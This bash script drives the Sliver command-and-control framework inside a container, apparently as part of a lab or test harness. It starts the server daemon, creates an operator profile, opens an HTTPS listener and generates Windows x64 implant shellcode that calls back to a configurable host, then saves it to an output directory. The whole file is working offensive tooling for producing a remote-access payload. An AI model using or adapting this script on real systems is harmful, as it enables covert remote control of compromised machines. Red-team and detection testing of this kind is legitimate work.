#!/bin/bash
# Drive sliver-server via stdin to: start HTTPS listener, generate shellcode, save it to /out.
# Runs INSIDE the sliver container (which already has sliver-server and sliver-client).
set -eu

LHOST="${LHOST:-host.docker.internal}"
LPORT="${LPORT:-8443}"
NAME="${NAME:-zero}"
OUT="${OUT:-/out/sliver-shellcode.bin}"

mkdir -p "$(dirname "$OUT")"

# Start sliver-server in daemon mode in the background
/usr/local/bin/sliver-server daemon --lhost 0.0.0.0 --lport 31337 >/tmp/sliver-daemon.log 2>&1 &
DAEMON_PID=$!

# Wait for daemon socket
for i in $(seq 1 30); do
    if ss -tln 2>/dev/null | grep -q ":31337"; then break; fi
    if grep -q "Multiplayer mode enabled" /tmp/sliver-daemon.log 2>/dev/null; then break; fi
    sleep 1
done
sleep 2

# Generate operator config via sliver-server CLI, then drive sliver-client interactively
/usr/local/bin/sliver-server operator --name operator --lhost 127.0.0.1 --lport 31337 --save /tmp/operator.cfg
/usr/local/bin/sliver-client import /tmp/operator.cfg

# Feed commands to sliver-client (interactive). The CLI accepts piped input.
/usr/local/bin/sliver-client <<EOF
https --lhost 0.0.0.0 --lport ${LPORT}
generate --http https://${LHOST}:${LPORT} --os windows --arch amd64 --format shellcode --save /tmp/${NAME}.bin --skip-symbols --name ${NAME}
EOF

# Sliver writes a .bin file; pick the first .bin under /tmp/ or the named one
if [ -f "/tmp/${NAME}.bin" ]; then
    cp "/tmp/${NAME}.bin" "$OUT"
elif ls /tmp/*.bin >/dev/null 2>&1; then
    cp "$(ls -1t /tmp/*.bin | head -1)" "$OUT"
else
    echo "[!] No .bin output found" >&2
    ls -la /tmp/ >&2
    exit 1
fi

echo "[+] Shellcode written to $OUT ($(stat -c%s "$OUT") bytes)"

# Keep daemon alive so we can interact further if needed
wait $DAEMON_PID
